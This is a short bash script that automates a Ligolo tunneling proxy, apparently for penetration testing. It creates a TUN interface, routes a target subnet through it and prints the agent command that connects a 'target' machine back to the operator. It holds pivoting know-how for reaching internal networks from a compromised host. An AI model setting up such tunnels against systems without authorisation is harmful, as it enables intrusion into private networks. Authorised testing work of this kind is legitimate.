#!/bin/bash

# Check if the script is being run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script needs to be run with sudo or as the root user."
    exit 1
fi

# Determine the local IP address for the connection
local_ip=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)

echo "Transfer ligoloagent to target Linux machine and run: './ligolo -connect ${local_ip}:11601 -ignore-cert'"
echo "Or transfer ligoloagent.exe to target Windows machine and run: '.\ligolo.exe -connect ${local_ip}:11601 -ignore-cert'"

# Function to convert a single IP to a /24 range
convert_ip_to_range() {
    local ip=$1
    local ip_parts=(${ip//./ })
    echo "${ip_parts[0]}.${ip_parts[1]}.${ip_parts[2]}.0/24"
}

# Ask for the IP or subnet range
read -p "Enter an IP address or subnet range (e.g., 192.168.1.1 or 192.168.1.0/24): " user_input

# Check if the input is in CIDR notation or a single IP
if [[ $user_input =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    # It's a single IP, convert it to a /24 range
    targetIP=$(convert_ip_to_range "$user_input")
else
    # Assume it's already in CIDR notation
    targetIP=$user_input
fi

# Extract base IP from the range
baseIP=$(echo "$targetIP" | cut -d/ -f1)

# Perform the commands
echo "Adding TUN/TAP interface..."
sudo ip tuntap add user $(whoami) mode tun ligolo

echo "Setting up the TUN/TAP interface..."
sudo ip link set ligolo up

echo "Adding route..."
sudo ip route add "${baseIP}/24" dev ligolo

echo "Running Ligolo with self-signed certificate..."
sudo /opt/Ligolo/proxy -selfcert

# Determine the local IP address for the connection
local_ip=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)

echo "Printing Ligolo connect command..."
echo "./ligolo -connect ${local_ip}:11601 -ignore-cert"
